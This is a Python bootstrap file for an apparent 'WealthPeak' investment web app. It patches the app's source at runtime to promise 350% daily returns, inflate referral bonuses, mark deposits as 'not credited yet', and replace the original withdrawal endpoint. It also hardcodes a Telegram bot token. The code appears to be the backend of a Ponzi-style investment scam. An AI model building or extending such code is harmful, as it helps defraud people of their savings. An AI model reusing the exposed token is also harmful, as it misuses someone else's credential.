"""Bootstrap: plans 350%/day, referral $20, receipt+Telegram, automation binary, wallets, CORS for Vercel"""
import os
from pathlib import Path

os.environ.setdefault(
    "TELEGRAM_BOT_TOKEN",
    "8680286371:AAH-Ba-nJ5XxpCR2_J6fqdCOgH2TTHJkUxI",
)
os.environ.setdefault("TELEGRAM_CHAT_ID", "8749416762")

_code = Path(__file__).with_name("app_FIXED.py").read_text()

_code = _code.replace(
    "REFERRAL_BONUS = 5.0          # $5 bonus to referrer when referred user invests",
    "REFERRAL_BONUS = 20.0         # $20 bonus to referrer when referred user invests",
)
_code = _code.replace(
    "REFERRAL_SIGNUP_BONUS = 2.0   # $2 bonus to new user who used a referral code",
    "REFERRAL_SIGNUP_BONUS = 5.0   # $5 bonus to new user who used a referral code",
)

_old_seed = '''    # Seed plans
    cursor.execute("SELECT COUNT(*) as cnt FROM plans")
    if cursor.fetchone()["cnt"] == 0:
        plans = [
            ("Starter", 10, 50.0, 7, "Invest $10 → Earn $5 daily for 7 days"),
            ("Bronze", 20, 50.0, 7, "Invest $20 → Earn $10 daily for 7 days"),
            ("Silver", 30, 50.0, 10, "Invest $30 → Earn $15 daily for 10 days"),
            ("Gold", 50, 50.0, 10, "Invest $50 → Earn $25 daily for 10 days"),
            ("Platinum", 100, 50.0, 14, "Invest $100 → Earn $50 daily for 14 days"),
            ("Diamond", 200, 50.0, 14, "Invest $200 → Earn $100 daily for 14 days"),
            ("VIP", 500, 55.0, 21, "Invest $500 → Earn $275 daily for 21 days"),
            ("Elite", 1000, 60.0, 21, "Invest $1000 → Earn $600 daily for 21 days"),
        ]
        cursor.executemany(
            "INSERT INTO plans (name, min_amount, daily_percent, duration_days, description) VALUES (?, ?, ?, ?, ?)",
            plans
        )'''

_new_seed = '''    cursor.execute("DELETE FROM plans")
    plans = [
        ("Starter", 50, 350.0, 7, "Invest $50 → Earn $175 daily (350%/day) for 7 days"),
        ("Bronze", 100, 350.0, 7, "Invest $100 → Earn $350 daily (350%/day) for 7 days"),
        ("Silver", 150, 350.0, 7, "Invest $150 → Earn $525 daily (350%/day) for 7 days"),
        ("Gold", 200, 350.0, 7, "Invest $200 → Earn $700 daily (350%/day) for 7 days"),
        ("Platinum", 300, 350.0, 10, "Invest $300 → Earn $1,050 daily (350%/day) for 10 days"),
        ("Diamond", 500, 350.0, 10, "Invest $500 → Earn $1,750 daily (350%/day) for 10 days"),
        ("Ruby", 750, 350.0, 10, "Invest $750 → Earn $2,625 daily (350%/day) for 10 days"),
        ("Emerald", 1000, 350.0, 14, "Invest $1,000 → Earn $3,500 daily (350%/day) for 14 days"),
        ("VIP", 1500, 350.0, 14, "Invest $1,500 → Earn $5,250 daily (350%/day) for 14 days"),
        ("Elite", 2000, 350.0, 14, "Invest $2,000 → Earn $7,000 daily (350%/day) for 14 days"),
    ]
    cursor.executemany(
        "INSERT INTO plans (name, min_amount, daily_percent, duration_days, description) VALUES (?, ?, ?, ?, ?)",
        plans
    )'''

if _old_seed in _code:
    _code = _code.replace(_old_seed, _new_seed)

_code = _code.replace(
    'f"PawaPay deposit ({country})"',
    'f"PENDING unpaid — PawaPay ({country}) — not credited yet"',
)
_code = _code.replace(
    'f"Pending deposit via {provider_name}"',
    'f"PENDING unpaid — {provider_name}"',
)

_code = _code.replace(
    '@app.route("/api/withdraw", methods=["POST"])\n@token_required\ndef withdraw():',
    '@app.route("/api/withdraw_legacy_disabled", methods=["POST"])\n@token_required\ndef withdraw_legacy():',
)

exec(compile(_code, "app_FIXED.py", "exec"), globals())

try:
    from flask_cors import CORS as _CORS
    _CORS(
        app,
        origins=[
            "https://wealthpeak-bill-023c.vercel.app",
            "https://wealthpeak.vercel.app",
            "https://wealthpeak-investments.netlify.app",
            "http://localhost:8080",
            "http://127.0.0.1:8080",
        ],
        supports_credentials=True,
        allow_headers=["Content-Type", "Authorization"],
        methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    )
except Exception as _e:
    print("cors re-apply", _e)

from receipt_telegram import register_receipt_routes, patch_withdraw
from automation import register_automation_routes
from wallets import register_wallet_routes, patch_credit_and_dashboard, credit_hourly_earnings

register_receipt_routes(app, get_db, token_required)
patch_withdraw(app, get_db, token_required)
register_automation_routes(app, get_db, token_required)
register_wallet_routes(app, get_db, token_required)
patch_credit_and_dashboard(app, get_db, token_required)

# Hourly growth into Investment wallet instead of lump daily credit
try:
    credit_daily_earnings = lambda user_id=None: credit_hourly_earnings(get_db, user_id)
except Exception as _e:
    print("hourly patch", _e)
